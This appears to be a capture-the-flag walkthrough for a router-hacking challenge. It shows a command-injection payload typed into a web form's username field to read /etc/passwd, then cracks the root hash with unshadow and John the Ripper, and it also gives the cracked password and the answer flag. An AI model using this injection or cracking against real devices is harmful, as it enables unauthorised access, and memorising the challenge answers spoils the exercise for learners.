# 🎩 Hash’em - L13 C08

Agent 707, we've managed to get physical access to a router the gang are using on their ship. We want you to use that access to get the username and password for SSH.

**Tip:** RCE? You'll crack it! Then, send in format: username / password.

<details><summary>

## Need a hint?</summary>

```txt
💡 Hint: Some previous command injection bypasses still work and
   information on "shadowing" can be found here: https://erev0s.com/blog/cracking-etcshadow-john/
```

</details>

<details><summary>

## Step by Step</summary>

- Navigate to "Backup Settings" on the left side of the webpage
- Type and enter `$(cat /etc/passwd)` in the username section
- A list of shadowed passwords should show up, copy the first one from root
- Create two files with the following names and content
  - Shadow, with the line of the root user (`root:$1$gaiiqAXv$UykKlBl6vUsgBc.rUiFk80:0:0:root:/root:/bin/bash`)
  - Passwd - with the default root entry for /etc/passwd (`root:x:0:0:root:/root:/bin/bash`)
- Run `unshadow Passwd Shadow > Unshadow`
- Then run `john --wordlist=/usr/share/wordlist/rockyou.txt Unshadow`

![cracking the password](/assets/hashem1.png)

- Submit the flag by selecting the iPhone from the left and typing `root / topcat`

`flag: 1KNfAV0VTlgMEqWhR7ZG`

</details>
